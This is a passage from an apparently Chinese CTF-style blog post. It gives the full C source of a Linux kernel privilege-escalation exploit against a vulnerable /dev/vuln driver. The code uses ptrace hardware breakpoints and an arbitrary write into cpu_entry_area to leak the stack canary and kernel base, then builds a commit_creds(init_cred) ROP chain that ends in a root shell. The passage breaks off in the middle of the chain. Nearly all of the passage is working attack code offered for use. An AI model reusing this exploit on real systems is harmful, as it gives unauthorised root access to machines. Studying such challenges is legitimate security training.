class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202160016.png" style="zoom:50%;" /><h3 id="rop链解法"><a href="#rop链解法" class="headerlink" title="rop链解法"></a>rop链解法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-type">size_t</span> canary;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> modprobe_path = <span class="hljs-number">0xffffffff82e8b920</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810f8240</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82e8a820</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff820010b0</span> + <span class="hljs-number">54</span>;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff81852a3d</span>;<br><span class="hljs-type">size_t</span> ret = <span class="hljs-number">0xffffffff81000905</span>;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> rop_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> * mmap_addr;<br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810f8240</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82e8a820</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff820010b0</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint64_t</span> vul;<br>&#125;vuln;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> vul)</span><br>&#123;<br>    vuln note;<br>    note.addr = addr;<br>    note.vul = vul;<br>    ioctl(dev_fd ,<span class="hljs-number">0</span> , &amp; note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(CPU_ENTRY_AREA_DB_STACK_RCX_ADDR, <span class="hljs-number">0x10</span>);<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br>    <br>    <span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        <span class="hljs-keyword">switch</span> (step)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            uname(uts);<br>            <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>            &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>                write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>                step++;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Wait for ROP chain&quot;</span>);<br>            <span class="hljs-keyword">if</span> (read(rop_pipe[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE) &lt; <span class="hljs-number">0</span>)<br>                err_exit(<span class="hljs-string">&quot;read ROP chain&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Get ROP chain successfully&quot;</span>);<br>            step++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Try to write ROP chain&quot;</span>);<br>            <span class="hljs-comment">// path 2</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">mm_map</span>;</span><br>            mm_map.start_code  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_code    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_data  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_data    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_brk   = <span class="hljs-number">0x2000000</span>;<br>            mm_map.brk         = <span class="hljs-number">0x2000000</span>;<br>            mm_map.start_stack = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.auxv        = MMAP_ADDR;<br>            mm_map.auxv_size   = <span class="hljs-number">0x140</span>;<br>            mm_map.exe_fd      = <span class="hljs-number">-2</span>;<br>            prctl(PR_SET_MM, PR_SET_MM_MAP, &amp;mm_map, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> leak;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br>    <br>    mmap_addr = mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!mmap_addr)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br><br>    pipe(pipe_fd);<br>    pipe(rop_pipe);<br><br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;canary, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname)+<span class="hljs-number">0X20</span>, <span class="hljs-number">8</span>);<br>    kernel_offset = leak -  <span class="hljs-number">0xffffffff810e0b32</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary is 0x%lx\n&quot;</span>, canary);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    pop_rdi += kernel_offset;<br>    commit_creds += kernel_offset;<br>    init_cred += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br>    <br><br>    <span class="hljs-built_in">memset</span>(MMAP_ADDR, <span class="hljs-number">0</span> , MMAP_SIZE);<br>    <span class="hljs-type">size_t</span> *rop_chain = mmap_addr;<br>    <span class="hljs-type">int</span> idx;<br>    idx = <span class="hljs-number">0x30</span>;<br>    rop_chain[idx] = canary;<br>    idx += <span class="hljs-number">7</span>;<br>    rop_chain[idx++] = pop_rdi;<br>    rop_chain[idx++] = init_cred;<br>    rop_chain[idx++] = commit_creds;<br>    rop_chain[idx++] = 